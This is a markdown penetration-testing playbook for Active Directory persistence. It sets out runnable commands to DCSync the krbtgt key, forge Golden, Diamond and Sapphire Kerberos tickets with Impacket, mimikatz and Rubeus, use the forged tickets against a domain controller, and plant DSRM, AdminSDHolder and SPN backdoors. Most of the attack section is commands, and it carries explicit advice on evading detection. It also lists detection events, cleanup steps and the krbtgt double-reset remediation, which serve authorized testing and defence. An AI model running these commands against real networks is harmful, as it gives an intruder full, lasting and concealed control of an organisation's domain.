---
tags:
  - hack-notes
  - playbook
  - ad
---

# DCSync to Golden Ticket Persistence Playbook

> From replication rights (Domain Admin or delegated DS-Replication-Get-Changes), DCSync the krbtgt key, then forge long-term Kerberos persistence (Golden, Diamond, Sapphire) and durable backstops (DSRM, AdminSDHolder, SPN).

> **Attack graph position**
> **Fed by:** [Coercion to ADCS ESC8 to Domain Admin](Coercion%20to%20ADCS%20ESC8%20to%20Domain%20Admin.md), [IPv6 mitm6 Relay to RBCD Takeover](IPv6%20mitm6%20Relay%20to%20RBCD%20Takeover.md), [Kerberoasting to Domain Admin](Kerberoasting%20to%20Domain%20Admin.md), [badSuccessor dMSA to Domain Admin](badSuccessor%20dMSA%20to%20Domain%20Admin.md).
> **Feeds into:** Cloud via Entra Connect: [Azure AiTM Token Theft to Global Admin](Azure%20AiTM%20Token%20Theft%20to%20Global%20Admin.md). End state: Domain Admin with golden-ticket persistence.
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance

| | |
|---|---|
| Goal | Establish durable, domain-wide persistence after Tier-0 is already reached |
| Starting position | An identity with replication rights: a Domain Admin, or any principal granted DS-Replication-Get-Changes and DS-Replication-Get-Changes-All on the domain head |
| End state | Forged TGTs minting arbitrary access at will plus one or more non-Kerberos backstops, survivable across credential resets short of a krbtgt double reset |
| Key techniques | T1003.006 (DCSync / OS Credential Dumping: DCSync), T1558.001 (Golden Ticket), T1558 (Diamond / Sapphire ticket variants), T1207 (DCShadow-adjacent), T1098 (Account Manipulation: DSRM, AdminSDHolder, SPN) |
| Prerequisites | Replication rights to the domain head; network reach to a DC over 135/445/389/88; domain SID and a target user-id known or discoverable |
| Difficulty | Low to forge, Medium to do quietly |
| Noise level | Loud for classic Golden; Quiet to Moderate for Diamond and Sapphire |

This is the dominance / persistence phase. You do not run this to get DA. You run it once you already hold DA (or equivalent replication rights) and you want a foothold that outlives the obvious cleanup. Treat every forged-ticket choice as an OPSEC decision, not a default.

## Attack Path

```
[ Replication rights held: DA or delegated DS-Replication-Get-Changes ]
        |
        v
1. DCSync krbtgt  (secretsdump -just-dc-user / mimikatz lsadump::dcsync)
   -> krbtgt NTLM + AES256 + AES128 keys, domain SID
        |
        v
2. Choose forge mode  <-- DECISION: detection sensitivity drives this
        |
   +----+-----------------------------+----------------------------+
   |                                   |                            |
   v (loud, offline)                   v (quieter, real TGT)        v (quietest, real PAC)
2a. GOLDEN                         2b. DIAMOND                  2c. SAPPHIRE
   forge TGT from scratch            request real TGT,            request real TGT,
   with krbtgt key                   decrypt, edit PAC,           swap in a privileged
                                     re-sign with krbtgt key      PAC via S4U2self+u2u
        |                                   |                            |
        +-----------------+-----------------+----------------------------+
                          v
3. Use the ticket  (KRB5CCNAME / Rubeus ptt -> wmiexec / psexec / dir \\dc\c$)
                          |
                          v
4. Durable non-Kerberos backstops  (DSRM, AdminSDHolder/SDProp, custom SPN)
                          |
                          v
5. OPSEC / cleanup awareness:  tickets are NOT revocable without krbtgt DOUBLE reset
```

The single most important branch is step 2. On a detection-sensitive engagement, skip classic Golden and go Diamond or Sapphire.

## Prerequisites and Setup

- Replication rights on the domain naming context. Verify with BloodHound (`GetChanges` / `GetChangesAll` edges to the domain object) or `Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -match 'Replication' }`.
- Network reach to a writable DC: 135 (RPC), 445 (SMB/DRSUAPI), 389 (LDAP), 88 (Kerberos).
- Tooling:
  - Impacket (current fork is `fortra/impacket`): `secretsdump.py`, `ticketer.py`, `getST.py`, `wmiexec.py`, `psexec.py`. On Kali these are `impacket-secretsdump`, etc.
  - Rubeus (Windows, on-host).
  - mimikatz (Windows, on-host) for `lsadump::dcsync` and `kerberos::golden`.
- Known values you will need: the domain FQDN (`corp.local`), the domain SID (`S-1-5-21-...`), and for Diamond/Sapphire a real domain account's credentials to drive the AS-REQ.

## Walkthrough

### Step 1. DCSync the krbtgt account

What and why: DCSync impersonates a DC and asks a real DC to replicate the krbtgt secret over DRSUAPI (`IDL_DRSGetNCChanges`). This yields the krbtgt NTLM hash plus the AES256/AES128 keys, which are the signing keys for every TGT in the domain. Pull only krbtgt to stay surgical; a full `-just-dc` dump is far louder.

From Linux (Impacket):

```bash
# Targeted pull of just the krbtgt object
secretsdump.py -just-dc-user 'corp.local/krbtgt' 'corp.local/Administrator:P@ssw0rd!@10.10.10.5'

# If you hold a hash rather than a password, pass-the-hash:
secretsdump.py -just-dc-user 'corp.local/krbtgt' -hashes :aad3b...:31d6c... 'corp.local/Administrator@10.10.10.5'
```

From Windows (mimikatz), useful when you are already on-host and want to avoid SMB exec:

```powershell
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt /dc:DC01
```

Success signal: a line like `krbtgt:502:aad3b...:<NTLM>:::` plus `aes256_hmac (...)` and `aes128_hmac (...)` blocks. Record the AES256 key; in 2024-2026 AES is the only encryption type you should forge with (see OPSEC). Also capture the domain SID from the same output (the `Object Security ID` / from `lookupsid.py` or `Get-ADDomain`).

Get the domain SID explicitly if needed:

```bash
lookupsid.py 'corp.local/Administrator:P@ssw0rd!@10.10.10.5' 0 | grep 'Domain SID'
```

Decision / branch: with the krbtgt key and domain SID in hand, choose your forge mode at step 2. Detection-sensitive engagement -> jump to Step 2b (Diamond) or 2c (Sapphire). Lab, smash-and-grab, or detection-out-of-scope -> Step 2a (Golden) is fastest.

### Step 2a. Forge a classic Golden Ticket (loud, fully offline)

What and why: a Golden Ticket is a TGT minted entirely offline from the krbtgt key. No DC contact at forge time. The downside: it is built from scratch, so the PAC contents are whatever you assert, and any field that does not match the directory (a non-existent user, an off-default lifetime, RC4 in an AES domain) is a detection hook.

Impacket `ticketer.py`, AES256, real account, sane lifetime:

```bash
ticketer.py \
  -aesKey <KRBTGT_AES256_KEY> \
  -domain corp.local \
  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
  -user-id 500 \
  -groups 512,513,518,519,520 \
  -duration 10 \
  Administrator
# writes Administrator.ccache
```

Notes that keep it less broken: impersonate a real, privileged, enabled account (`Administrator`, id 500), not a made-up "goduser". Use the real domain SID. Default groups 512 (Domain Admins), 513, 518 (Schema Admins), 519 (Enterprise Admins), 520. Keep `-duration` at the domain default (10 hours), not the legacy mimikatz 10-year default, which is a screaming anomaly.

Mimikatz equivalent on Windows:

```powershell
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /aes256:<KRBTGT_AES256_KEY> /id:500 /groups:512,513,518,519,520 /ptt
```

Rubeus equivalent:

```powershell
Rubeus.exe golden /aes256:<KRBTGT_AES256_KEY> /user:Administrator /id:500 /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /groups:512,513,518,519,520 /nowrap
```

Success signal: a `.ccache` (Impacket) or a base64 `.kirbi` / in-memory inject (`/ptt`). Proceed to Step 3 to use it.

### Step 2b. Forge a Diamond Ticket (quieter: real TGT, edited PAC)

What and why: a Diamond ticket does not invent a TGT. It performs a legitimate AS-REQ as a real account, gets a real TGT back, decrypts it with the krbtgt key, modifies the embedded PAC (escalate groups / swap the user), re-signs and re-encrypts with the krbtgt key. Because a genuine 4768 (AS-REQ) precedes use, the "4769 without a preceding 4768" Golden tell disappears. You need the krbtgt key AND credentials for a real (any) domain account to drive the request.

Impacket `ticketer.py` Diamond mode (`-request` turns it into a Diamond forge):

```bash
ticketer.py \
  -request \
  -domain corp.local \
  -user lowpriv \
  -password 'UserPass1' \
  -aesKey <KRBTGT_AES256_KEY> \
  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
  -user-id 500 \
  -groups 512,513,518,519,520 \
  -duration 10 \
  Administrator
```

Rubeus Diamond mode (current Huntress-modernized action ports `/ldap` and opsec niceties from golden/silver into diamond):

```powershell
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512,513,518,519,520 /krbkey:<KRBTGT_AES256_KEY> /enctype:aes256 /domain:corp.local /dc:DC01 /nowrap
```

`/tgtdeleg` uses the current session to obtain a base TGT without supplying a password. Alternatively supply `/user /password /dc` to request the base TGT explicitly. Use `/ldap` (modern Rubeus) to auto-pull the impersonated user's real id and group set so the edited PAC matches the directory exactly, which removes the manual `/groups` guess as a tell.

Success signal: a forged ticket whose base TGT corresponds to a real, observed AS-REQ on the DC. Proceed to Step 3.

Decision / branch: Diamond still re-signs a PAC you assembled. For the quietest possible PAC, where the privileged claims are lifted verbatim from a genuine directory PAC, use Sapphire (Step 2c).

### Step 2c. Forge a Sapphire Ticket (quietest: real TGT, real privileged PAC)

What and why: Sapphire is the current state of the art for stealth. It takes Diamond's "real TGT base" and, instead of you authoring the privileged PAC, it obtains a genuine privileged PAC for a powerful account via the S4U2self + U2U trick and drops that real PAC into your TGT. The resulting ticket is an assembly of legitimate elements following a standard request flow, which makes it the hardest forged-ticket variant to detect because the PAC structure and signatures are exactly what the KDC itself produced.

Impacket `ticketer.py` Sapphire mode (`-request` plus `-impersonate` of the privileged target):

```bash
ticketer.py \
  -request \
  -impersonate Administrator \
  -domain corp.local \
  -user lowpriv \
  -password 'UserPass1' \
  -aesKey <KRBTGT_AES256_KEY> \
  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
  Administrator
```

Here `-impersonate` triggers the S4U2self+u2u retrieval of the target's real PAC; you do not pass `-user-id` or `-groups` because those come from the genuine PAC. Confirm your Impacket build supports the Sapphire path (`-impersonate` on `ticketer.py`); update the fortra fork if not present.

Success signal: a `.ccache` whose PAC matches Administrator's real group membership and SID history, with KDC-authored signatures. Proceed to Step 3.

### Step 3. Use the forged ticket

What and why: load the ticket into your auth context and act. The forged TGT lets you request any service ticket, so any DA-level action is now available.

Linux (Impacket, ccache):

```bash
export KRB5CCNAME=$(pwd)/Administrator.ccache

# Prove it: list the ccache, then act over Kerberos (-k -no-pass)
klist
wmiexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
# or
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local
```

Always reference the host by FQDN (`DC01.corp.local`), not IP, or Kerberos SPN resolution fails (see Troubleshooting).

Windows (Rubeus / mimikatz inject then use):

```powershell
Rubeus.exe ptt /ticket:<base64-or-kirbi>
# or mimikatz: kerberos::ptt Administrator.kirbi
klist
dir \\DC01.corp.local\c$
```

Success signal: command execution or `c$` listing on the DC as the impersonated principal. The persistence primitive is now proven.

### Step 4. Add durable non-Kerberos backstops

What and why: forged tickets are powerful but share a single point of failure, the krbtgt key. A defender who double-resets krbtgt invalidates every Golden/Diamond/Sapphire ticket at once. Layer backstops that do not depend on krbtgt so the foothold survives a krbtgt rotation. Add only what the engagement scope authorizes, document each, and remove them in Cleanup.

DSRM persistence (the local DC Administrator restore-mode account; sync it to a known hash, then enable network logon):

```powershell
# Set DSRM password to a known account's hash
mimikatz # token::elevate
mimikatz # lsadump::setntlm /server:DC01.corp.local /user:DSRM-target ... 
# Read current DSRM hash for later use:
mimikatz # lsadump::sam
# Allow DSRM account to authenticate over the network:
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
# Then pass-the-hash as DC01\Administrator (the local DSRM account, RID 500 of the DC SAM)
```

AdminSDHolder / SDProp persistence (grant yourself rights on the AdminSDHolder template; SDProp re-stamps it onto all protected Tier-0 groups every ~60 minutes, so even if your group membership is stripped, the ACL backdoor re-applies):

```powershell
# Grant FullControl to a controlled principal on AdminSDHolder
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity controlleduser -Rights All
# SDProp propagates this to Domain Admins, Enterprise Admins, etc. within the hour.
# Verify after propagation:
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ? { $_.SecurityIdentifier -match '<controlleduser SID>' }
```

Custom SPN persistence (a low-key roastable service account you control, or an SPN added to an existing account so you can re-Kerberoast on demand):

```powershell
# Add an SPN to a controlled account to keep a roastable credential
Set-DomainObject -Identity controlleduser -Set @{serviceprincipalname='fake/persist.corp.local'}
# Later, re-Kerberoast that SPN from any low-priv context to recover a TGS to crack.
```

Success signal: DSRM PtH logon works; the AdminSDHolder ACL re-appears on Tier-0 groups after the SDProp cycle; the SPN is roastable. Each of these survives a krbtgt reset.

### Step 5. Persistence-awareness checkpoint

What and why: this is not a step you run, it is the fact you brief the team. Forged tickets cannot be revoked individually and cannot be revoked at all by resetting user or admin passwords. The only thing that invalidates them is a krbtgt double reset (see OPSEC and Cleanup). Your Kerberos persistence therefore has a known kill switch on the defender's side, which is exactly why the Step 4 backstops matter.

## OPSEC and Detection

DCSync (Step 1):
- Event 4662 (operation on a directory object) on the DC, where the Properties field contains the replication control access rights GUIDs: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes), `1131f6ad-...` (Get-Changes-All), `89e95b76-...` (Get-Changes-In-Filtered-Set). A 4662 with these GUIDs sourced from an account or host that is not a DC is the canonical DCSync alert.
- Network-side: DRSUAPI `IDL_DRSGetNCChanges` (RPC opnum 3) from a non-DC IP. Mature SOCs alert on replication traffic that does not originate from a known DC.
- Reduce noise: pull only `-just-dc-user krbtgt`, never a full `-just-dc`. Run from a host that already legitimately talks to the DC if you can. There is no way to make DCSync silent at the 4662 layer; accept it and move fast.

Golden Ticket (Step 2a) tells, the loudest variant:
- RC4 (etype 0x17) in a domain whose krbtgt/clients/services all have AES keys. A forged RC4 TGT stands out badly post-2024. Always forge AES256.
- Ticket lifetime / renew anomalies: a TGT lifetime far past the 10-hour domain policy (the legacy 10-year mimikatz default) is trivially flagged.
- 4769 (TGS request) with no preceding 4768 (AS-REQ) for that account: an injected, pre-forged TGT never did an AS exchange, so the TGS appears "out of nowhere".
- PAC anomalies: non-existent username, account whose RID does not match the asserted SID, group set inconsistent with the directory.
- Mismatched `domain\user` vs SID in account-logon events.

Diamond (Step 2b) evasion and residual tells:
- A real 4768 precedes use, so the "4769 without 4768" tell is gone. The residual risk is a PAC whose group membership or SID does not match what the directory says for that user. Use Rubeus `/ldap` (or matching ticketer values) so the edited PAC is directory-consistent.

Sapphire (Step 2c) evasion:
- PAC, signatures and request flow are KDC-authored, so PAC-content heuristics fail. Residual signal is behavioral: an S4U2self+U2U sequence from an account that has no legitimate constrained-delegation reason, followed by privileged access. Detection here is anomaly/behavioral, not signature.

Backstops (Step 4):
- DSRM: 4657/registry-audit on `DsrmAdminLogonBehavior`, and a 4624 logon type 3 by the DC's local Administrator (RID 500 of the machine SAM) is highly abnormal.
- AdminSDHolder: 5136 (directory object modified) on `CN=AdminSDHolder`, and ACL changes re-appearing on Tier-0 groups after each SDProp cycle.
- SPN: 4738 / 5136 showing a `servicePrincipalName` added to a user object, plus subsequent Kerberoast (4769 with RC4 for that SPN).

General: forge with AES256, keep lifetimes at domain default, impersonate real enabled privileged accounts, and prefer Diamond/Sapphire whenever detection is in scope.

## Cleanup

- Forged tickets: there is nothing to delete on the DC, the tickets live only in your ccache / memory. Destroy your artifacts: `unset KRB5CCNAME; rm -f *.ccache *.kirbi`, and `kerberos::purge` / `klist purge` on any host where you injected. Brief the client that the only way to invalidate any tickets you may have forged is a krbtgt double reset (see below), and that this is true of any attacker who reached this stage, not just this test.
- krbtgt double reset (the real remediation, document it for the client): reset the krbtgt password twice with a gap longer than the maximum TGT lifetime (default 10 hours) between resets, allowing full DC replication and legitimate ticket renewal in between. AD keeps current + previous krbtgt password, so a single reset still honors tickets signed with the prior key; two resets, properly spaced, evict them. Use Microsoft's `New-KrbtgtKeys.ps1`, which enforces the spacing and replication checks. Do not perform both resets back-to-back or you will break domain auth.
- DSRM: revert `DsrmAdminLogonBehavior` to its prior value (`reg delete ... /v DsrmAdminLogonBehavior` or set back to 0), and reset the DSRM password to a fresh value the client controls.
- AdminSDHolder / SDProp: remove the ACE you added from `CN=AdminSDHolder,CN=System,...` (`Remove-DomainObjectAcl`), then force or wait one SDProp cycle so the cleaned template re-stamps the protected groups; verify the backdoor ACE is gone from Domain Admins et al.
- Custom SPN: remove the SPN you added (`Set-DomainObject -Clear serviceprincipalname` or remove the controlled account entirely if you created it).
- Hand the client a list of every backstop you placed with timestamps so nothing is left behind.

## Troubleshooting

- KDC_ERR_WRONG_REALM / SPN not found when using the ticket: you referenced the DC by IP. Use the FQDN (`DC01.corp.local`) and ensure DNS resolves it; Kerberos needs the SPN, not an address.
- KRB_AP_ERR_SKEW (clock skew): your host clock is more than 5 minutes off the DC. Sync first: `ntpdate DC01.corp.local` or `sudo timedatectl set-ntp true`, or `net time` on Windows.
- Ticket rejected / KDC_ERR_PADATA_TYPE_NOSUPP or signature failures: encryption-type mismatch. You forged with an etype the account does not advertise, or you used the NTLM hash where the domain expects AES. Re-forge with the AES256 key (`-aesKey` / `/krbkey ... /enctype:aes256`).
- Wrong domain SID: the forged PAC SID prefix must match the domain exactly. Re-pull it (`lookupsid.py`, `Get-ADDomain | select DomainSID`); a mismatched SID yields access-denied even with a valid krbtgt key.
- krbtgt key mismatch / tickets suddenly stop working: the defender already reset krbtgt (possibly twice). Re-DCSync to pull the new key; if a double reset happened, all prior forged tickets are dead and you must re-forge. This is the expected outcome of correct remediation.
- DCSync itself fails (RPC access denied): the identity lacks Get-Changes AND Get-Changes-All. Confirm both control-access rights are granted on the domain head before retrying.
- Diamond/Sapphire base request fails: the driving account is disabled, password-expired, or smartcard-required. Use a different real, enabled account for the AS-REQ.

## Variations and Pivots

- Silver Ticket: when you only need one service and want zero DC contact, forge a TGS directly against a target service account's key (no krbtgt needed). Quieter than Golden for single-service access but does not roam.
- Cross-forest / SID History: in a multi-domain forest, add Enterprise Admin or a parent-domain group via SID History in the forged PAC to jump trust boundaries (where SID filtering is not enforced).
- DCShadow: instead of forged tickets, register a rogue DC and push directory changes (e.g. add SID History or primaryGroupID) that replicate as legitimate, an alternative dominance/persistence path with a different telemetry profile.
- Golden gMSA / Golden dMSA, and Golden Certificate (forge from the CA key) are adjacent durable-persistence techniques once you hold the relevant Tier-0 secret.
- Chain in: this playbook assumes DA is already held. For the routes that get you here, see [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md); for the raw Kerberos and Impacket command references used above, see [Active Directory and Kerberos](../Cheatsheets/Active%20Directory%20and%20Kerberos.md) and [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md).

## Related

- [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md)
- [Active Directory and Kerberos](../Cheatsheets/Active%20Directory%20and%20Kerberos.md)
- [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md)
- [Compromise Assessment](../Checklists/Compromise%20Assessment.md)
- Ariadne